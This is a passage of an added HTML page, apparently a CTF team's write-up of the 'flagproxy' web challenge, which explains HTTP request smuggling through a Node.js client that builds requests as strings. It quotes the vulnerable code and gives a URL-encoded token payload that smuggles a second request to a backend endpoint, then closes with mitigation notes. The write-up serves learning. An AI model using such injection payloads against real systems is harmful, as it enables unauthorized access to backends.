+    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">header</span> <span class="k">in</span> <span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if </span><span class="p">(</span><span class="nx">header</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="se">\r\n</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="nx">header</span><span class="p">].</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="se">\r\n</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">continue</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">header</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="nx">header</span><span class="p">]}</span><span class="s2">\r\n`</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Content-Type: text/plain\r\n`</span><span class="p">;</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Content-Length: </span><span class="p">${</span><span class="nx">options</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">}</span><span class="s2">\r\n`</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Content-Length: 0\r\n`</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Connection: close\r\n`</span><span class="p">;</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`\r\n`</span><span class="p">;</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="nx">options</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">client</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+
+  <span class="p">});</span>
+
+  <span class="kd">let</span> <span class="nx">response</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+
+  <span class="nx">client</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">response</span> <span class="o">+=</span> <span class="nx">data</span><span class="p">;</span>
+  <span class="p">});</span>
+
+  <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">client</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nf">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+    <span class="p">});</span>
+
+    <span class="nx">client</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
+      <span class="nf">resolve</span><span class="p">(</span><span class="nf">parseResponse</span><span class="p">(</span><span class="nx">response</span><span class="p">));</span>
+    <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Now as one can see, the implementation builds an HTTP request <strong>as a string</strong>, that is then sent to the backend via socket.</p>
+
+<p>Exploring the code a little in combination with what we know from the rest of the frontend, we find:</p>
+<ul>
+  <li>index.js, line 19-32 (the <code class="language-plaintext highlighter-rouge">/flag</code> endpoint) - Notice that the token value (controllable by a potential attacker) is being passed to the http-client <code class="language-plaintext highlighter-rouge">request()</code> function</li>
+</ul>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Missing token</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nf">request</span><span class="p">(</span><span class="s2">`http://</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BACK</span><span class="p">}</span><span class="s2">:8080/flag`</span><span class="p">,</span> <span class="p">{</span><span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="na">headers</span><span class="p">:</span> <span class="p">{</span><span class="na">Authorization</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">}</span><span class="s2">`</span><span class="p">,},})</span>
+    <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">There has been an error with the request</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<ul>
+  <li>http-client.js, line 30-53 (part of <code class="language-plaintext highlighter-rouge">request()</code> method; here we see that our token value gets written to the http <code class="language-plaintext highlighter-rouge">request</code> string; with no filter except line-breaks):</li>
+</ul>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">async </span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">options</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">parsedUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+
+  <span class="kd">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Socket</span><span class="p">();</span>
+  <span class="nx">client</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">client</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">port</span> <span class="o">||</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">hostname</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+
+    <span class="kd">let</span> <span class="nx">request</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">options</span><span class="p">.</span><span class="nx">method</span><span class="p">}</span><span class="s2"> </span><span class="p">${</span><span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">+</span> <span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">search</span><span class="p">}</span><span class="s2"> HTTP/1.0\r\n`</span><span class="p">;</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Host: </span><span class="p">${</span><span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">host</span><span class="p">}</span><span class="s2">\r\n`</span><span class="p">;</span>
+    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">header</span> <span class="k">in</span> <span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if </span><span class="p">(</span><span class="nx">header</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="se">\r\n</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="nx">header</span><span class="p">].</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="se">\r\n</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">continue</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">header</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="nx">header</span><span class="p">]}</span><span class="s2">\r\n`</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Content-Type: text/plain\r\n`</span><span class="p">;</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Content-Length: </span><span class="p">${</span><span class="nx">options</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">}</span><span class="s2">\r\n`</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Content-Length: 0\r\n`</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Connection: close\r\n`</span><span class="p">;</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`\r\n`</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Let’s have a look at what <code class="language-plaintext highlighter-rouge">parsedURL</code> actually looks like:
+<img src="img/flagproxy1_parseUrl.png" alt="" /></p>
+
+<p>So we know that the frontend <code class="language-plaintext highlighter-rouge">/flag</code> endpoint embeds our provided <code class="language-plaintext highlighter-rouge">token</code> value into an <code class="language-plaintext highlighter-rouge">Authorization</code> header of the <code class="language-plaintext highlighter-rouge">request</code> string. In order to understand how we can leverage this for an exploit, let’s go through these steps:</p>
+
+<ol>
+  <li>I send a GET request to the frontend to <code class="language-plaintext highlighter-rouge">/flag?token=tokenValue123</code></li>
+  <li>The frontend builds the request string resulting into the following request:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /flag
+Host: back:8080
+Authorization: Bearer tokenValue123   &lt;--- this is our injection point
+Content-Type: text/plain
+Content-Length: 0
+Connection: close
+</code></pre></div></div>
+
+<ol>
+  <li>Instead of <code class="language-plaintext highlighter-rouge">tokenValue123</code>, we now put a carefully crafted payload to smuggle a second request to the backend’s <code class="language-plaintext highlighter-rouge">/add-token</code> endpoint. Our goal is to have the frontend craft this request in its <code class="language-plaintext highlighter-rouge">request</code> string:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /flag
+Host: back:8080
+Authorization: Bearer tokenValue123    &lt;--- start injection at token value
+Content-Type: text/plain
+Content-Length: 0
+Connection: Keep-Alive
+
+
+GET /add-token?token=ourNewAccessToken
+Host: back:8080                        &lt;--- stop injection after this line
+Content-Type: text/plain
+Content-Length: 0
+Connection: close
+
+
+</code></pre></div></div>
+
+<p>Important: Note the <code class="language-plaintext highlighter-rouge">Connection: Keep-Alive</code> Header on the first request. This allows for the connection to stay open and receive additional requests. If it would stay on <code class="language-plaintext highlighter-rouge">Connection: close</code> as the http-client adds it, the exploit would not work:
+<img src="img/flagproxy2_portswigger.png" alt="" /></p>
+
+<hr />
+<p><strong>Note</strong></p>
+
+<p>This is where I got stuck on the challenge. I knew I needed to smuggle a request generating a token, but unfortunately I failed at implementing a working exploit. I struggled with correctly putting linebreaks that worked and I also did not know that the <code class="language-plaintext highlighter-rouge">Connection: Keep-Alive</code> was necessary. However, I still was able to solve the challenge by fuzzing token values that other teams might have smuggled to the backend. Since the token needed to be 10 chars long minimum, I figured some teams might have used very simple tokens like <code class="language-plaintext highlighter-rouge">aaaaaaaaaa</code> or <code class="language-plaintext highlighter-rouge">1111111111</code>. After trying like 5 tokens, I got lucky with <code class="language-plaintext highlighter-rouge">1234567890</code>:</p>
+
+<p><img src="img/flagproxy3_bypass.png" alt="" /></p>
+
+<p>I describe how the actual payload had to look like below, which I learned from discussions on the discord after the event was over. Also writing it up helps solidify the knowledge gained, even though I wasnt able to solve the challenge myself (at least not the right way).</p>
+
+<hr />
+
+<p>Back to the actual exploit: So how do we handle linebreaks? The HTTP specification says CRLF.
+However, the http-client has a filter for exactly that on line 41:
+<code class="language-plaintext highlighter-rouge">if (header.includes('\r\n') || options.headers[header].includes('\r\n')) { continue; }</code>
+However:</p>
+<blockquote>
+  <p>According to the HTTP spec a server can accept only \n as a line separator
+It’s not suggested, but it can be done</p>
+</blockquote>
+
+<p>So we can use the payload from above with LF (url encoded = <code class="language-plaintext highlighter-rouge">%0a</code>) line separator.</p>
+
+<p>As said above, this will be the HTTP inside our token value:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokenValue123
+Content-Type: text/plain
+Content-Length: 0
+Connection: Keep-Alive
+
+
+GET /add-token?token=ourNewAccessToken
+Host: back:8080
+</code></pre></div></div>
+
+<p>Replacing line separator with <code class="language-plaintext highlighter-rouge">%0a</code> and space with <code class="language-plaintext highlighter-rouge">+</code> gives:</p>
+
+<p><code class="language-plaintext highlighter-rouge">tokenValue123%0aContent-Type:+text/plain%0aContent-Length:+0%0aConnection:+Keep-Alive%0a%0a%0aGET+/add-token?token=ourNewAccessToken%0aHost:+back:8080
+</code></p>
+
+<p>When using this payload, we get the following response:</p>
+
+<p><img src="img/flagproxy4_exploit.png" alt="" /></p>
+
+<p>Now we can get the flag with the token we just set:</p>
+
+<p><img src="img/flagproxy5_flag.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">flag{sanity_check}</code></p>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+<p>I learned details about HTTP specification and that request smuggling vulnerabilities can arise not only from Content Length vs. Transfer Encoding Headers but also from other circumstances in proxy/backend server architectures that, when sending one request to the proxy server, enable crafting a second request inside of the first one.</p>
+
+<h2 id="additional-notes-and-mitigation-of-the-vulnerability">Additional notes and mitigation of the vulnerability</h2>
+
+<p>This exploit was disclosed on the hackerone bug bounty platform for the node.js version 17.8.0:
+<a href="https://hackerone.com/reports/1524692">https://hackerone.com/reports/1524692</a></p>
+
+<p>Mitigating the vulnerability could be achieved by updating node.js version.</p>
+
+<p>The following is interesting to remember for HTTP/2 (since the challenge was not using HTTP/2 though, it did not affect the exploit):
+<img src="img/flagproxy6_http2.png" alt="" /></p>
+</p>
+            </div>
+          </div>
+
+          <!-- Other Options -->
+          <div class="post-share-options clearfix">
+            <!--
+            <div class="pull-left">
+              <ul class="tags">
+                <li><a href="#">Gaming</a></li>
+                <li><a href="matches.html">Matches</a></li>
+                <li><a href="#">Players</a></li>
+              </ul>
+            </div>
+            -->
+            <!--
+            <div class="social-links pull-right">
+              <ul class="social-links">
+                <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+                <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+                <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+                <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+              </ul>
+            </div>
+            -->
+          </div>
+        </div>
+
+        <!--Sidebar Side-->
+        <div class="sidebar-side col-lg-4 col-md-12 col-sm-12">
+          <aside class="sidebar">
+
+            <!-- Tags Widget -->
+            <div class="sidebar-widget popular-tags">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Task categories</h4>
+                
+                  <a href="#">web</a>
+                
+                  <a href="#">Request Smuggling</a>
+                
+                  <a href="#">javascript</a>
+                
+              </div>
+            </div>
+
+            <!-- Search -->
+            <!--
+            <div class="sidebar-widget search-box">
+              <form method="post" action="contact.html">
+                <div class="form-group">
+                  <input type="search" name="search-field" value="" placeholder="Search" required>
+                  <button type="submit"><span class="icon fa fa-search"></span></button>
+                </div>
+              </form>
+            </div>
+            -->
+
+            <!-- Post Widget -->
+            <div class="sidebar-widget popular-posts">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Recent Writeups</h4>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2019/10/27/Numtonce.html"><img src="/writeup/2019/10/27/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Sep 8, 2022</div>
+                    <div class="text"><a href="/writeup/2019/10/27/Numtonce.html">Numtonce</a></div>
+                  </div>
+
+                </article>
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2020/02/05/Draw_with_us.html"><img src="/writeup/2020/02/05/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Sep 8, 2022</div>
+                    <div class="text"><a href="/writeup/2020/02/05/Draw_with_us.html">Draw with us</a></div>
+                  </div>
+
+                </article>
+                
+                
+              </div>
+            </div>
+
+            <!-- Category Widget -->
+            <!--
+            <div class="sidebar-widget categories">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Categories</h4>
+                <ul class="blog-categories">
+                  <li><a href="blog-single.html">Gaming</a></li>
+                  <li><a href="blog-single.html">Matches</a></li>
+                  <li><a href="blog-single.html">Video games</a></li>
+                  <li><a href="blog-single.html">Esports</a></li>
+                  <li><a href="blog-single.html">Champions</a></li>
+                </ul>
+              </div>
+            </div>
+            -->
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- End Sidebar Page Container -->
+
+	<!-- Main Footer -->
+  <footer class="main-footer">
+    	<div class="auto-container">
+        	<!--Widgets Section-->
+            <div class="widgets-section">
+            	<div class="row clearfix">
+                	
+                    <!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget logo-widget">
+							<div class="logo">
+                            	<a href="/index.html"><img src="/assets/images/logo.png" alt="" /></a>
+                            </div>
+							<div class="text"></div>
+						</div>
+					</div>
+					
+					<!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget links-widget">
+							<div class="widget-content">
+								<div class="footer-title">
+									<h2>Links</h2>
+								</div>
+								<div class="row clearfix">
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/about_us.html">About</a></li>
+											<li><a href="/members.html">Our Team</a></li>
+											<li><a href="/events.html">News and CTFs</a></li>
+											<li><a href="/contact.html">Contact</a></li>
+										</ul>
+									</div>
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/contact.html">Help & Support</a></li>
+											<li><a href="/privacy_policy.html">Privacy Policy</a></li>
+										</ul>
+									</div>
+								</div>
+							</div>	
+						</div>
+					</div>
+					
+					<!--Column                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget newsletter-widget">
+							<div class="footer-title">
+                            	<h2>Newsletter</h2>
+                            </div>
+							<div class="text">Subsrcibe us now to get the latest news and updates</div>
+							<div class="newsletter-form">
+                                <form method="post" action="contact.html">
+                                    <div class="form-group clearfix">
+                                        <input type="email" name="email" value="" placeholder="Email address" required>
+                                        <button type="submit" class="theme-btn newsletter-btn"><span class="fas fa-envelope"></span></button>
+                                    </div>
+                                </form>
+                            </div>
+						</div>
+					</div>
+					-->
+
+				</div>
+			</div>
+		</div>
+		
+		<!-- Footer Bottom -->
+		<div class="footer-bottom">
+			<div class="auto-container">
+				<!--Scroll to top-->
+				<div class="scroll-to-top scroll-to-target" data-target="html"><span class="flaticon-up-arrow"></span></div>
+				<!--Scroll to top-->
+				<div class="row clearfix">
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<div class="copyright">&copy; Copyrights, 2019 All Rights Reserved</div>
+					</div>
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<ul class="social-icons">
+							<li><a href="https://twitter.com/letzpwn"><span class="fab fa-twitter"></span></a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+  </footer>
+  
+</div>
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/popper.min.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+<script src="/assets/js/jquery-ui.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/owl.js"></script>
+<script src="/assets/js/appear.js"></script>
+<script src="/assets/js/wow.js"></script>
+<script src="/assets/js/scrollbar.js"></script>
+<script src="/assets/js/script.js"></script></body>
+
+</html>
